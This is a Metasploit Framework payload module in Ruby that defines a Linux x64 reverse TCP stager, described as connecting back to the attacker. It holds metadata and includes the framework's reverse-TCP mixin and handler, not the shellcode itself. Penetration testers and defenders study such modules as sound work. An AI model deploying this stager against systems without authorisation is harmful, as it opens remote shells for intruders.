##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/linux/x64/reverse_tcp'

module MetasploitModule

  CachedSize = 129

  include Msf::Payload::Stager
  include Msf::Payload::Linux::ReverseTcp_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => ['ricky', 'tkmru'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        => { 'Payload' => '' }))
  end

end
